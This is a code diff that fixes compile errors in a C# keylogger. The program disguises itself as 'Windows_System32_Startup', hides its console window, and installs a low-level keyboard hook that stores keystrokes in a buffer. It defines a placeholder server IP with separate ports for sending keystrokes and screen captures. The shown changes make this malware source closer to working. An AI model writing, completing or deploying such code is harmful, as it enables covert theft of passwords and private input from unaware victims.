@@ -1,3 +1,4 @@
+using System;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Diagnostics;
@@ -5,25 +6,24 @@ using System.Windows.Forms;
 
 public static class Globals
 {
-    public static String serverIP = "~~~~~"
-    public const Int32 keyPort = 40404
-    public const Int32 screenPort = 40405
-    public const char[256] keysLogged
-    public const int bufIndex = 0
+    public static String serverIP = "~~~~~";
+    public static Int32 keyPort = 40404;
+    public static Int32 screenPort = 40405;   
 }
 
 public class Windows_System32_Startup
 {
-    private const WH_KEYBOARD_LL = 13;
+    private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
-    private LowLevelKeyboardProc proc = HookFunc;
+    private static LowLevelKeyboardProc proc = HookFunc;
     private static IntPtr hookInt = IntPtr.Zero;
-    
+	private char[] userBuffer = new char[256];
+    private int bufIndex = 0;
     static public void Main ()
     {
         var wind = GetConsoleWindow();
         ShowWindow(wind, SW_HIDE);
-        hookInt = SetHook(proc);
+        hookInt = SetWindowsHookEx(WH_KEYBOARD_LL, proc, (IntPtr)null, 0);
         Application.Run();
         UnhookWindowsHookEx(hookInt);
     }
